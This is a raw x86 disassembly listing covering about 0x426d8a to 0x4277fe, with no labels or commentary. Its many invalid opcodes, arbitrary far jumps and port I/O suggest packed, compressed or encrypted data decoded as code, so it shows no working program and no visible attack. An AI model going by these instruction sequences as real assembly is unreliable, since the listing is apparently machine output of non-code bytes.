  426d8a:	stos   BYTE PTR es:[edi],al
  426d8b:	leave  
  426d8c:	inc    eax
  426d8d:	add    dh,BYTE PTR [esi+0x76]
	...
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0x6a0c:0xc7c2ecf9
  426e01:	mov    al,0x36
  426e03:	inc    edx
  426e04:	add    al,0x9f
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	pusha  
  426e0d:	add    al,0xb1
  426e0f:	loopne 0x426df7
  426e11:	push   esp
  426e12:	mov    WORD PTR [esi+0x6a],fs
  426e15:	and    bh,BYTE PTR [edx-0x37]
  426e18:	xlat   BYTE PTR ds:[ebx]
  426e19:	inc    esp
  426e1a:	icebp  
  426e1b:	(bad)  
  426e1c:	je     0x426db5
  426e1e:	clc    
  426e1f:	loop   0x426e21
  426e21:	mov    bh,0x31
  426e23:	sbb    al,0xbb
  426e25:	push   eax
  426e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e27:	xor    DWORD PTR [ecx],ebp
  426e29:	fadd   st,st(5)
  426e2b:	rcr    DWORD PTR [eax-0x77ada989],1
  426e31:	clc    
  426e32:	add    edi,0xffffffd9
  426e35:	cmp    DWORD PTR [ebx],ebx
  426e37:	fiadd  WORD PTR ds:[ebx+0x4026a749]
  426e3f:	(bad)  
  426e41:	lahf   
  426e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e43:	test   eax,0xee7a10c
  426e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e49:	and    BYTE PTR [esp+edi*2+0x7a51ed90],ch
  426e50:	adc    BYTE PTR [edx+0x68b6ae56],ch
  426e56:	bound  eax,QWORD PTR ss:[edi+0x675975a9]
  426e5d:	out    dx,eax
  426e5e:	ficomp WORD PTR [ebp+esi*4+0xd]
  426e62:	(bad)  
  426e64:	out    dx,eax
  426e65:	(bad)  
  426e66:	(bad)
  426e69:	rcl    DWORD PTR es:[esi-0x51ad731c],1
  426e70:	cmp    eax,0x114705e2
  426e75:	jns    0x426e76
  426e77:	(bad)  
  426e78:	cli    
  426e79:	push   ds
  426e7a:	push   esp
  426e7b:	je     0x426e29
  426e7d:	sbb    DWORD PTR [ebp-0x1c91cf28],edx
  426e83:	mov    ebx,ecx
  426e85:	stos   BYTE PTR es:[edi],al
  426e86:	sbb    ebp,DWORD PTR [edx]
  426e88:	sub    DWORD PTR [edi],eax
  426e8a:	xor    al,0xcb
  426e8c:	mov    bh,0x47
  426e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e8f:	push   eax
  426e90:	(bad)
  426e94:	sub    al,0x4c
  426e96:	into   
  426e97:	jg     0x426f01
  426e99:	test   eax,0xefdc8c01
  426e9e:	pop    ecx
  426e9f:	sub    BYTE PTR [ecx],al
  426ea1:	jg     0x426e9f
  426ea3:	push   edi
  426ea4:	fsincos 
  426ea6:	sub    DWORD PTR [ebx],edx
  426ea8:	sub    al,0x8e
  426eaa:	inc    edx
  426eab:	mov    ebp,0x3cd25229
  426eb0:	mov    ss,edx
  426eb2:	fs popa 
  426eb4:	cs (bad) 
  426eb6:	xchg   esi,eax
  426eb7:	mov    ah,0x93
  426eb9:	inc    ebp
  426eba:	mov    esp,0xd6be3d23
  426ebf:	out    0xb6,eax
  426ec1:	push   edx
  426ec2:	adc    dh,BYTE PTR [edi+esi*8]
  426ec5:	push   es
  426ec6:	and    cl,0x32
  426ec9:	cmp    al,BYTE PTR [eax-0x25]
  426ecc:	or     eax,0x96b3cc7f
  426ed1:	nop
  426ed2:	mov    bl,0x94
  426ed4:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ed7:	jmp    0xb376:0x979cbbca
  426ede:	sbb    DWORD PTR [ebx+0x64],edi
  426ee1:	shr    BYTE PTR ds:0xa35e4329,0xa3
  426ee8:	add    DWORD PTR [edi+0x29],esp
  426eeb:	xlat   BYTE PTR ds:[ebx]
  426eec:	pop    esi
  426eed:	scas   eax,DWORD PTR es:[edi]
  426eee:	out    0xe8,eax
  426ef0:	out    dx,al
  426ef1:	cs jg  0x426e96
  426ef4:	add    ecx,0xffffffdd
  426ef7:	cmp    al,0x92
  426ef9:	xchg   DWORD PTR [ebx-0xb66f541],edi
  426eff:	shr    DWORD PTR [ecx-0x4c2f8b99],0x3d
  426f06:	js     0x426f4a
  426f08:	cwde   
  426f09:	clc    
  426f0a:	pop    ebx
  426f0b:	dec    ecx
  426f0c:	ss loop 0x426ec8
  426f0f:	aad    0x0
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esi+eax*1+0x83fa897],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	mov    DWORD PTR [eax+ecx*4+0x73a5db00],edi
  426f93:	imul   esi,DWORD PTR [edx+esi*4],0x64c3cede
  426f9a:	aas    
  426f9b:	and    eax,0x3a4487a3
  426fa0:	sbb    BYTE PTR [ebx+0x2cc6064f],ch
  426fa6:	mov    WORD PTR [eax-0xc76183d],fs
  426fac:	push   ecx
  426fad:	dec    ebp
  426fae:	stc    
  426faf:	inc    esi
  426fb0:	adc    ebx,DWORD PTR [ecx]
  426fb2:	nop
  426fb3:	(bad)  
  426fb4:	and    esi,DWORD PTR es:[edx]
  426fb7:	adc    DWORD PTR [ecx+eax*1+0x4f58f19],ecx
  426fbe:	cli    
  426fbf:	scas   al,BYTE PTR es:[edi]
  426fc0:	retf   0x3885
  426fc3:	std    
  426fc4:	or     esp,0xffffffbc
  426fc7:	out    dx,al
  426fc8:	mov    edi,0x4976f1c3
  426fcd:	aad    0x7f
  426fcf:	out    0x8d,eax
  426fd1:	imul   ebx,DWORD PTR [eax-0x6],0xffffffe9
  426fd5:	sahf   
  426fd6:	je     0x426fef
  426fd8:	mov    al,ds:0x6a92a1af
  426fdd:	out    dx,eax
  426fde:	test   eax,0xf890d8a1
  426fe3:	add    DWORD PTR [edi-0x7a],0x19
  426fe7:	into   
  426fe8:	jbe    0x427011
  426fea:	dec    ebp
  426feb:	xor    bh,0x59
  426fee:	push   ss
  426fef:	mov    eax,0x786fb1e1
  426ff4:	pop    ecx
  426ff5:	mov    edx,0x645821b1
  426ffa:	mov    bh,0xa7
  426ffc:	mov    ebx,edx
  426ffe:	(bad)  
  427000:	mov    al,0x8e
  427002:	pop    edi
  427003:	ja     0x427069
  427005:	test   al,0x77
  427007:	pop    eax
  427008:	leave  
  427009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42700a:	cs adc eax,0xd1355513
  427010:	in     al,dx
  427011:	retf   
  427012:	push   ecx
  427013:	faddp  st(3),st
  427015:	xor    BYTE PTR [esi+0x6412fba3],dh
  42701b:	frstor [edx+ecx*8-0x1255be79]
  427022:	cld    
  427023:	pop    ebp
  427024:	mov    esi,0x5a30a100
  427029:	inc    eax
  42702a:	inc    edx
  42702b:	mov    ah,0x1b
  42702d:	test   eax,0x928ca867
  427032:	or     al,0x41
  427034:	xor    al,0xae
  427036:	jle    0x427053
  427038:	jge    0x426fd3
  42703a:	addr16 dec eax
  42703c:	jl     0x426fef
  42703e:	call   0x95a3:0xac4a2912
  427045:	jp     0x42706d
  427047:	(bad)  
  427048:	scas   eax,DWORD PTR es:[edi]
  427049:	sub    edx,DWORD PTR [edx]
  42704b:	ins    BYTE PTR es:[edi],dx
  42704c:	mov    edi,0x8fb849ff
  427051:	fisttp QWORD PTR [ebp+0x3c538765]
  427057:	sbb    bl,BYTE PTR [edx]
  427059:	mov    esp,0xe3432120
  42705e:	sub    eax,0xb9afe1ca
  427063:	mov    dh,bh
  427065:	push   edi
  427066:	pop    esi
  427067:	hlt    
  427068:	stc    
  427069:	jns    0x42701c
  42706b:	sbb    eax,0xa0b7c980
  427070:	xor    DWORD PTR [ecx],eax
  427072:	inc    esp
  427073:	dec    edi
  427074:	aam    0x4c
  427076:	out    dx,eax
  427077:	sub    bl,BYTE PTR [ebp-0x2d]
  42707a:	xlat   BYTE PTR ds:[ebx]
  42707b:	lds    edx,FWORD PTR [esi-0x10573d42]
  427081:	jp     0x427091
  427083:	jb     0x42702b
  427085:	mov    ds:0x45fab7da,eax
  42708a:	pop    ecx
  42708b:	adc    BYTE PTR [edx-0x22],ch
  42708e:	jmp    0x0:0x48
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x9b0d9d96
  427102:	into   
  427103:	mov    ds:0x1a10c,al
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	cdq    
  42710d:	test   DWORD PTR [ecx],edi
  42710f:	js     0x42710f
  427111:	aad    0xfc
  427113:	dec    esp
  427114:	xor    ecx,DWORD PTR [edx-0x21]
  427117:	mov    BYTE PTR [ecx],ah
  427119:	mov    al,0x5e
  42711b:	jge    0x4270ce
  42711d:	mov    edi,0x4963b1b7
  427122:	adc    esi,DWORD PTR [ecx+0x4c]
  427125:	push   es
  427126:	jle    0x427180
  427128:	jne    0x427178
  42712a:	mov    ch,0xa0
  42712c:	pushf  
  42712d:	out    dx,eax
  42712e:	adc    al,0xb0
  427130:	xchg   ebx,eax
  427131:	cmp    BYTE PTR [edx],ah
  427133:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427134:	mov    bl,0x3f
  427136:	out    dx,al
  427137:	mov    esp,0x25e35d5b
  42713c:	pop    ecx
  42713d:	pop    esp
  42713e:	mov    eax,0x56265120
  427143:	push   ebx
  427144:	or     edx,DWORD PTR [esi+ebp*8+0x21]
  427148:	and    al,0xad
  42714a:	pop    ecx
  42714b:	inc    ebx
  42714c:	mov    edi,0x9616212c
  427151:	aam    0x53
  427153:	repnz push ss
  427155:	shl    DWORD PTR [edi],0xe7
  427158:	mov    DWORD PTR [eax+0x407ffb32],ebp
  42715e:	popf   
  42715f:	sub    DWORD PTR [edx+0x2b96175c],0xcf19db45
  427169:	xor    DWORD PTR [edx-0x76da605],0x39
  427170:	mov    edi,0xb91985b3
  427175:	and    cl,BYTE PTR [esi-0x7e]
  427178:	jnp    0x4271f8
  42717a:	pop    esp
  42717b:	push   ebx
  42717c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42717d:	or     DWORD PTR [edx+ebp*1+0x2db8e408],esp
  427184:	aaa    
  427185:	or     esp,esi
  427187:	sti    
  427188:	jle    0x427116
  42718a:	mov    ch,al
  42718c:	xor    DWORD PTR [edi-0x2ad3dd47],esi
  427192:	rcr    BYTE PTR [edi+0x31b6b5ce],0xb0
  427199:	push   edx
  42719a:	mov    ?,edi
  42719c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42719d:	fstp   st(2)
  42719f:	std    
  4271a0:	push   cs
  4271a1:	mov    ds:0xf96ed1c6,al
  4271a6:	es scas al,BYTE PTR es:[edi]
  4271a8:	popf   
  4271a9:	stos   BYTE PTR es:[edi],al
  4271aa:	repz adc eax,0x7ee57440
  4271b0:	shl    BYTE PTR [edx+0x2da1d2a4],0x8e
  4271b7:	into   
  4271b8:	scas   al,BYTE PTR es:[edi]
  4271b9:	in     eax,0x18
  4271bb:	add    cl,BYTE PTR [ecx-0x1f8eb405]
  4271c1:	sbb    ch,ah
  4271c3:	cmp    ebp,DWORD PTR [eax]
  4271c5:	jno    0x427235
  4271c7:	pusha  
  4271c8:	mov    es,eax
  4271ca:	ficomp DWORD PTR [ecx]
  4271cc:	es mov ebx,0xddd72c46
  4271d2:	jmp    0x427183
  4271d4:	int    0x96
  4271d6:	inc    ecx
  4271d7:	or     al,0x2e
  4271d9:	fisttp QWORD PTR [ecx]
  4271db:	xchg   BYTE PTR [eax],ah
  4271dd:	jae    0x42721c
  4271df:	loopne 0x4271be
  4271e1:	imul   eax,DWORD PTR [edx],0x5f
  4271e4:	cmp    BYTE PTR [edi+edx*4-0x6],0x4f
  4271e9:	cdq    
  4271ea:	stc    
  4271eb:	(bad)  
  4271ec:	mov    ebp,0xf4137372
  4271f1:	mov    ah,0x11
  4271f3:	dec    ebx
  4271f4:	xchg   esp,eax
  4271f5:	stos   DWORD PTR es:[edi],eax
  4271f6:	or     al,0xac
  4271f8:	cmp    al,0x5
  4271fa:	inc    eax
  4271fb:	cmp    DWORD PTR [eax],esp
  4271fd:	lds    esi,FWORD PTR [edi+0x1]
  427200:	in     eax,0x19
  427202:	je     0x29db2636
  427208:	cmp    al,0x73
  42720a:	fmulp  st(6),st
  42720c:	mov    cl,0x33
  42720e:	add    eax,0xa4
	...
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x11380f8d,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	dec    esp
  42728d:	in     al,0xfe
  42728f:	jmp    0x2d2:0x20b212d2
  427296:	(bad)
  42729a:	cmp    BYTE PTR [ebp+0x4a],bh
  42729d:	jmp    0x8d3a6d5e
  4272a2:	jecxz  0x427255
  4272a4:	inc    BYTE PTR [edx+0x36]
  4272a7:	sbb    cl,BYTE PTR [edx+0x4e4003a3]
  4272ad:	push   ds
  4272ae:	aam    0x1a
  4272b0:	clc    
  4272b1:	arpl   sp,si
  4272b3:	test   al,0xb3
  4272b5:	aad    0x52
  4272b7:	add    ch,cl
  4272b9:	test   eax,0xf250bb0f
  4272be:	mov    gs,WORD PTR [esi+edx*4]
  4272c1:	sub    eax,0x28e2ed54
  4272c6:	call   0xca88:0xe0bbd2f1
  4272cd:	sub    al,0xbb
  4272cf:	sub    esp,DWORD PTR [edx+edx*4-0x29]
  4272d3:	gs pop ebx
  4272d5:	adc    DWORD PTR [eax],0x24
  4272d8:	fist   WORD PTR [edi+0x104c2d80]
  4272de:	push   es
  4272df:	mov    ds:0x3d10ced5,eax
  4272e4:	xchg   esi,eax
  4272e5:	scas   eax,DWORD PTR es:[edi]
  4272e6:	(bad)  
  4272e7:	outs   dx,DWORD PTR ds:[esi]
  4272e8:	out    dx,eax
  4272e9:	and    al,0xc2
  4272eb:	adc    eax,0x89f87024
  4272f0:	aaa    
  4272f1:	fisubr WORD PTR [esi]
  4272f3:	mov    ch,0x2e
  4272f5:	pop    edx
  4272f6:	test   DWORD PTR [eax+0x1c],edi
  4272f9:	inc    esp
  4272fa:	inc    ebp
  4272fb:	mov    bh,0x1f
  4272fd:	stos   DWORD PTR es:[edi],eax
  4272fe:	sub    DWORD PTR [edx+ebp*4],0xfffffff0
  427302:	adc    eax,0xb6b829a1
  427307:	pop    ecx
  427308:	adc    eax,0xee40f00d
  42730d:	jmp    0x427358
  42730f:	cmp    bl,BYTE PTR [edx]
  427311:	stos   DWORD PTR es:[edi],eax
  427312:	jmp    0x79ff2e1
  427317:	push   es
  427318:	xchg   BYTE PTR [esi+esi*1-0x43de36b5],cl
  42731f:	pop    edx
  427320:	das    
  427321:	addr16 sbb al,0x4d
  427324:	bound  esi,QWORD PTR [edx-0xb]
  427327:	mov    al,BYTE PTR [esi]
  427329:	mov    al,ds:0xe674beda
  42732e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42732f:	js     0x4273a7
  427331:	sub    ch,BYTE PTR [edx*1+0x1b44e661]
  427338:	jae    0x42736c
  42733a:	fmul   DWORD PTR [edi-0x217a0916]
  427340:	das    
  427341:	or     eax,ecx
  427343:	std    
  427344:	dec    esp
  427345:	xchg   ebx,eax
  427346:	mov    DWORD PTR [esp+ebp*4-0x2e],eax
  42734a:	or     al,0x14
  42734c:	push   ss
  42734d:	(bad)  
  42734f:	and    DWORD PTR [ecx-0x17],esi
  427352:	inc    ebp
  427353:	adc    cl,BYTE PTR [edi]
  427355:	sbb    esp,DWORD PTR [ebx-0x71b2924e]
  42735b:	xor    eax,0x84a52011
  427360:	outs   dx,DWORD PTR ds:[esi]
  427361:	jge    0x4273b5
  427363:	add    BYTE PTR [edi-0x61],dh
  427366:	lds    ebx,FWORD PTR [eax-0x30]
  427369:	add    al,0x87
  42736b:	out    0xcc,al
  42736d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42736e:	mov    ebp,0xe19fc988
  427373:	mov    ah,0x63
  427375:	mov    al,0x96
  427377:	mov    ebx,DWORD PTR [ebp-0x22]
  42737a:	xchg   DWORD PTR [edx],ebp
  42737c:	and    eax,0xe74cb25e
  427381:	push   ds
  427382:	and    eax,0xd3a3962b
  427387:	enter  0x937e,0xaa
  42738b:	pusha  
  42738c:	pop    edi
  42738d:	bound  eax,QWORD PTR [ebp+0x88]
	...
  4273f3:	add    BYTE PTR [edx],dl
  4273f5:	sbb    eax,0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    edx,ecx
  427401:	cmp    al,0x57
  427403:	fs adc al,0xa3
  427406:	add    DWORD PTR [eax],eax
  427408:	add    al,0x1
  42740a:	add    BYTE PTR [eax],al
  42740c:	sub    dl,ch
  42740e:	xor    eax,0x758c0718
  427413:	dec    esi
  427414:	dec    esp
  427415:	ds mov ch,0xd9
  427418:	mov    eax,0x75601e4e
  42741d:	pop    eax
  42741e:	xchg   BYTE PTR [esi+0x3e],bh
  427421:	fist   DWORD PTR [edx-0x65]
  427424:	mov    al,0xd8
  427426:	enter  0x8d43,0xe
  42742a:	loope  0x4274aa
  42742c:	xor    eax,0xb90119e6
  427431:	out    0x90,al
  427433:	push   edi
  427434:	mov    eax,ds:0xbe879d6a
  427439:	test   bh,bl
  42743b:	sub    al,0xf9
  42743d:	dec    eax
  42743e:	cmp    DWORD PTR [ebx-0x4d9e0737],0x1a41a9
  427448:	scas   eax,DWORD PTR es:[edi]
  427449:	or     cl,BYTE PTR [edx-0x36]
  42744c:	div    DWORD PTR [edx]
  42744e:	jmp    0xf17a:0xe4dde068
  427455:	push   ss
  427456:	cwde   
  427457:	je     0x4273ef
  427459:	stos   BYTE PTR es:[edi],al
  42745a:	jne    0x42745c
  42745c:	out    dx,al
  42745d:	loopne 0x427469
  42745f:	dec    ebx
  427460:	inc    esi
  427461:	jno    0x4273fc
  427463:	dec    ebx
  427464:	cmp    edi,esp
  427466:	iret   
  427467:	ja     0x427409
  427469:	outs   dx,DWORD PTR ds:[esi]
  42746a:	popa   
  42746b:	dec    edx
  42746c:	inc    edi
  42746d:	pop    ebx
  42746e:	pop    edx
  42746f:	add    al,0x57
  427471:	lods   eax,DWORD PTR ds:[esi]
  427472:	ds cmp eax,0xab914693
  427478:	xchg   edx,eax
  427479:	push   esi
  42747a:	shl    BYTE PTR [ebp-0x16],cl
  42747d:	lock or al,0x50
  427480:	cs call 0xc2b03f6f
  427486:	pop    ebx
  427487:	jmp    0xf2381cad
  42748c:	push   edx
  42748d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42748e:	loope  0x4274a4
  427490:	mov    ch,0xc8
  427492:	inc    eax
  427493:	daa    
  427494:	inc    esp
  427495:	adc    BYTE PTR [edx+0x7725dab6],al
  42749b:	repnz fs add ch,0x11
  4274a0:	shr    DWORD PTR ds:0x493b962c,cl
  4274a6:	outs   dx,BYTE PTR ds:[esi]
  4274a7:	scas   eax,DWORD PTR es:[edi]
  4274a8:	retf   
  4274a9:	push   0x797d3c4a
  4274ae:	pop    ebx
  4274af:	dec    eax
  4274b0:	(bad)  
  4274b1:	jmp    0x7a1fd8b6
  4274b6:	sbb    DWORD PTR [ebp+0x72],esp
  4274b9:	cmc    
  4274ba:	int    0x19
  4274bc:	jne    0x427442
  4274be:	pop    ebx
  4274bf:	mov    ?,edi
  4274c1:	hlt    
  4274c2:	mov    dh,0x59
  4274c4:	cdq    
  4274c5:	push   esi
  4274c6:	sbb    ah,BYTE PTR [ecx+ecx*4+0x6d]
  4274ca:	inc    edi
  4274cb:	out    0xdf,al
  4274cd:	push   es
  4274ce:	addr16 jle 0x4274b9
  4274d1:	and    bl,BYTE PTR [ecx+0x63]
  4274d4:	shl    al,0x6d
  4274d7:	adc    bl,BYTE PTR [esi-0x17]
  4274da:	push   ecx
  4274db:	xor    esp,DWORD PTR [esp+ebx*1]
  4274de:	enter  0x4fbf,0xc1
  4274e2:	frstor [eax]
  4274e4:	dec    eax
  4274e5:	push   ebx
  4274e6:	xor    BYTE PTR [ecx-0x37],0x42
  4274ea:	stos   BYTE PTR es:[edi],al
  4274eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274ec:	inc    esi
  4274ed:	and    bl,BYTE PTR [edx-0x339e72a0]
  4274f3:	nop
  4274f4:	inc    edx
  4274f6:	dec    ebp
  4274f7:	add    al,0xee
  4274f9:	call   0x44f32d06
  4274fe:	inc    edi
  4274ff:	scas   eax,DWORD PTR es:[edi]
  427500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427502:	lds    edi,FWORD PTR [eax-0x7614a7b6]
  427508:	pop    edx
  427509:	mov    ds:0x93ff7456,eax
  42750e:	js     0x427583
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	sbb    bl,0xf6
  427583:	add    eax,0x1a418
  427588:	add    al,0x1
  42758a:	add    BYTE PTR [eax],al
  42758c:	jae    0x427599
  42758e:	cmp    ch,bl
  427590:	aaa    
  427591:	adc    cl,cl
  427593:	ffree  st(5)
  427595:	(bad)  
  427596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427597:	lea    esp,[eax]
  427599:	inc    eax
  42759a:	push   edi
  42759b:	add    ecx,edx
  42759d:	and    bh,BYTE PTR [ebx-0x18cf3262]
  4275a3:	je     0x4275cd
  4275a5:	mov    esi,0xd59c9cce
  4275aa:	bound  edi,QWORD PTR [ebx+0x62e745a7]
  4275b0:	lea    esp,[edi+0x32]
  4275b3:	gs lock pop esi
  4275b6:	mov    eax,0x5f402117
  4275bb:	dec    edx
  4275bc:	cwde   
  4275bd:	and    dl,cl
  4275bf:	enter  0x5b2e,0xf8
  4275c3:	dec    edx
  4275c4:	mov    esi,0xfe90931a
  4275c9:	xchg   edx,eax
  4275ca:	out    0xae,al
  4275cc:	sbb    DWORD PTR [edx+0x54],ebp
  4275cf:	dec    edx
  4275d0:	imul   esi,DWORD PTR [esi+ecx*1+0x16],0xd98f89cc
  4275d8:	ficom  DWORD PTR [ecx-0x74]
  4275db:	gs inc edx
  4275dd:	push   ebp
  4275de:	xor    al,0x1a
  4275e0:	retf   
  4275e1:	loop   0x42758b
  4275e3:	shl    BYTE PTR [ebx],0x27
  4275e6:	sbb    dh,BYTE PTR [esi+0x1d]
  4275e9:	sbb    BYTE PTR [ecx-0x21775bd7],ch
  4275ef:	mov    ebx,ebp
  4275f1:	loop   0x427580
  4275f3:	jg     0x427665
  4275f5:	loop   0x42757f
  4275f7:	sub    al,0x37
  4275f9:	hlt    
  4275fa:	sahf   
  4275fb:	ja     0x4275f9
  4275fd:	repnz fld TBYTE PTR [ebp-0x3c5777bd]
  427604:	mov    bh,ch
  427606:	lea    ecx,[ebp+0x21844820]
  42760c:	fst    QWORD PTR [edx]
  42760e:	add    al,0xfa
  427610:	(bad)  
  427611:	nop
  427612:	(bad)  
  427613:	aas    
  427614:	sbb    eax,DWORD PTR [ebp-0x71]
  427617:	test   esp,ebp
  427619:	adc    ch,BYTE PTR [eax-0x60c3f49a]
  42761f:	mov    WORD PTR [esi-0x4aa40f7e],ds
  427625:	jae    0x42766f
  427627:	(bad)  
  427629:	inc    ebx
  42762a:	int3   
  42762b:	test   BYTE PTR [esi+0x5f],ch
  42762e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42762f:	scas   al,BYTE PTR es:[edi]
  427630:	push   ebp
  427631:	(bad)  
  427633:	jo     0x427675
  427635:	mov    al,0x3f
  427637:	adc    al,0x17
  427639:	or     al,0xc9
  42763b:	pop    ebx
  42763c:	fsubr  QWORD PTR [edx+0x79]
  42763f:	mov    al,ds:0xb3f728c2
  427644:	jp     0x42761a
  427646:	xchg   DWORD PTR [ebx],esp
  427648:	dec    esp
  427649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42764a:	in     eax,dx
  42764b:	or     al,0xfa
  42764d:	mov    DWORD PTR [edi-0x534c805e],eax
  427653:	cmp    ch,BYTE PTR ss:[edx+0x2e]
  427657:	repz push cs
  427659:	(bad)  
  42765b:	xor    ecx,esi
  42765d:	ins    BYTE PTR es:[edi],dx
  42765e:	inc    edx
  42765f:	mov    ds:0x35b3be3d,eax
  427664:	or     al,0xba
  427666:	fs xor eax,0xe0531f38
  42766c:	rcr    BYTE PTR [edx],cl
  42766e:	nop
  42766f:	stc    
  427670:	out    dx,eax
  427671:	loope  0x427651
  427673:	aam    0x10
  427675:	and    BYTE PTR [ebx],bh
  427677:	xchg   edi,eax
  427678:	outs   dx,DWORD PTR ds:[esi]
  427679:	push   0x8fb729cc
  42767e:	jmp    0xc63ecef5
  427683:	fs ret 
  427685:	popa   
  427686:	and    bh,BYTE PTR [edx-0x7d]
  427689:	pushf  
  42768a:	xlat   BYTE PTR ds:[ebx]
  42768b:	sahf   
  42768c:	icebp  
  42768d:	jno    0x42768c
  42768f:	rol    BYTE PTR [eax],cl
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fdecstp 
  427701:	jmp    0x42769b
  427703:	sbb    DWORD PTR [eiz*4+0x1040001],0x106e0000
  42770e:	ret    
  42770f:	icebp  
  427710:	pop    ebx
  427711:	xchg   ebp,eax
  427712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427713:	inc    eax
  427714:	shr    BYTE PTR [ebp+0x15],cl
  427717:	jmp    0x79936f1
  42771c:	mov    bh,0x88
  42771e:	das    
  42771f:	imul   ebx,DWORD PTR [ebx+0x3a6a1bc0],0x44c93628
  427729:	das    
  42772a:	mov    dh,0x1
  42772c:	leave  
  42772d:	and    al,BYTE PTR [ecx+0x4d59c1b8]
  427733:	lea    esp,ds:0x98333597
  427739:	jmp    0x427729
  42773b:	jle    0x4276fe
  42773d:	loopne 0x42773e
  42773f:	stos   BYTE PTR es:[edi],al
  427740:	into   
  427741:	dec    esi
  427742:	mov    DWORD PTR ds:0xaaa3a3a,ecx
  427748:	out    dx,al
  427749:	sbb    esp,DWORD PTR [edx]
  42774b:	and    eax,DWORD PTR [eax+0xfa68888]
  427751:	enter  0xf25c,0xd
  427755:	mov    esi,0x8edcd2ac
  42775a:	imul   edi,DWORD PTR [ebx-0x5b0ed6f1],0x3ac2eb19
  427764:	inc    edx
  427765:	or     DWORD PTR [edx+0x37],ebp
  427768:	pop    edx
  427769:	cld    
  42776a:	push   eax
  42776b:	push   edx
  42776c:	pop    esp
  42776d:	mov    ebp,0x5057ddf7
  427772:	jb     0x4277d7
  427774:	adc    al,0xde
  427776:	leave  
  427777:	xlat   BYTE PTR ds:[ebx]
  427778:	xchg   esi,eax
  427779:	mov    edi,0xc606c7f
  42777e:	mov    al,ah
  427780:	cs pop edx
  427782:	dec    ecx
  427783:	test   BYTE PTR [ebp+ecx*4+0x6793b356],dh
  42778a:	and    bh,bh
  42778c:	sbb    DWORD PTR [edx],edi
  42778e:	rcr    BYTE PTR [esi-0x6be3170b],0x90
  427795:	cld    
  427796:	push   ds
  427797:	xchg   BYTE PTR [edx-0x35],cl
  42779a:	not    BYTE PTR [esi]
  42779c:	je     0x427814
  42779e:	pop    es
  42779f:	adc    BYTE PTR [edi],0xbc
  4277a2:	lods   eax,DWORD PTR ds:[esi]
  4277a3:	mov    ebx,0xa4cba20a
  4277a8:	cs sbb eax,0x1b9742e3
  4277ae:	das    
  4277af:	loop   0x4277e0
  4277b1:	inc    DWORD PTR [edx+eax*4+0x4f35e69c]
  4277b8:	test   eax,0x5bae6e66
  4277bd:	mov    esp,0xfd910ff5
  4277c2:	inc    edx
  4277c3:	jno    0x427749
  4277c5:	jmp    0xd2910bbf
  4277ca:	cmp    ah,ah
  4277cc:	test   al,0xb8
  4277ce:	aaa    
  4277cf:	mov    BYTE PTR [edx+0x5c],0xd3
  4277d3:	int3   
  4277d4:	xor    ebx,esi
  4277d6:	and    esp,ebp
  4277d8:	repz add dl,BYTE PTR [eax]
  4277db:	neg    DWORD PTR [ebx+eax*4+0x1fd24499]
  4277e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277e3:	rcl    ch,cl
  4277e5:	not    BYTE PTR [edx]
  4277e7:	inc    ebp
  4277e8:	adc    eax,0x6689e50d
  4277ed:	mov    DWORD PTR [edi+0x74],esi
  4277f0:	xchg   edx,eax
  4277f1:	aaa    
  4277f2:	sub    dh,BYTE PTR [edx-0x3d]
  4277f5:	mov    bh,0x5b
  4277f7:	pop    ss
  4277f8:	int3   
  4277f9:	mov    al,ds:0x4e6df09
  4277fe:	jnp    0x427863
